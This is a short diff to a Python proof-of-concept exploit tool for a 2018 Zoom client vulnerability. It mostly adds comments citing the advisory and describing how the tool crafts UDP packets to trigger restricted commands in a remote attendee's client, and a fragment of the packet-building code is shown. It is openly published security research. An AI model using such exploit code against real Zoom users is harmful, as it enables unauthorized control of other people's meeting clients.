@@ -5,11 +5,15 @@ import sys
 import base64
 from msg_templates import *
 
+# https://www.tenable.com/security/research/tra-2018-40
+# This code crafts and sends UDP packets to invoke restricted commands
+# found in Zoom's ssb_sdk
+#
 
 class Zoomster:
     '''
     Toolset Invokes Restricted Functionalities in Remote Zoom Clients.
-    This is only a MINIMAL POC example and may require additional tweaking for various scenarios
+    This is a MINIMAL POC example and may require additional tweaking for various scenarios
 
     :param remote_ip: target attendee's IP address
     :param local_port: local port of source Zoom user
@@ -35,7 +39,7 @@ class Zoomster:
             self.P2P_HEADER,
             chr(src_attendee_id),
             chr(src_attendee_id),
-            '\x04', # value may be other multiple of 0x04 (0x8, 0x10, ...)
+            '\x04', # value may be other multiple of 4 depending on call (0x8, 0x10, ...)
             chr(len(msg_payload)),
             chr(len(msg_payload)),
             msg_payload
